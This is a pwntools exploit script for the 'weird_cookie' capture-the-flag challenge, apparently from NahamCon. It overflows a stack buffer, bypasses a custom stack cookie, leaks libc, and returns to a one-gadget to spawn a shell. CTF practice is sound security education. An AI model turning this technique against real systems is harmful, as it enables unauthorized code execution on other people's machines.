#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template weird_cookie
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'weird_cookie_patched_dbg')
libc = ELF("./libc-2.27.so")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("challenge.nahamcon.com", 30961)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# gef config context.nb_lines_stack 50 
gdbscript = '''
tbreak main
br *main+220
br *main+187
br *main+107
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvline()
stack_cookie = b"\x12\x34\x56\x78\x9a\xac\x8e\xe9"[::-1]
stack_cookie = b"\x12\x34\x29\x5c\x78\x5a\xd9\x81"[::-1]
payload = b"A"*(8*5) + stack_cookie + b"A"*(8)
io.sendline(payload)

io.recv(len(payload))
leak = io.recvuntil(b"\x7f")
log.info(f"{len(leak)=}")
libc_start_main_231 = u64( leak.ljust(8,b'\x00') ) - 0x0a + 0x87 # questa riga dipende dalla libc
log.info(f"{libc_start_main_231=:x}")

io.recvlines(2)


libc.address = libc_start_main_231 - libc.sym.__libc_start_main - 231 
log.info(f"{libc.address=:x}")
log.info(f"{libc.sym.printf=:x}")
stack_cookie = 0x123456789abcdef1 ^ libc.sym.printf 
log.info(f"{stack_cookie=:x}")
payload = b"A"*(8*5) + p64(stack_cookie) + b"A"*(8) + p64(libc.address + 0x4f2a5)
log.info(f"{len(payload)=}")
io.sendline(payload)


io.interactive()

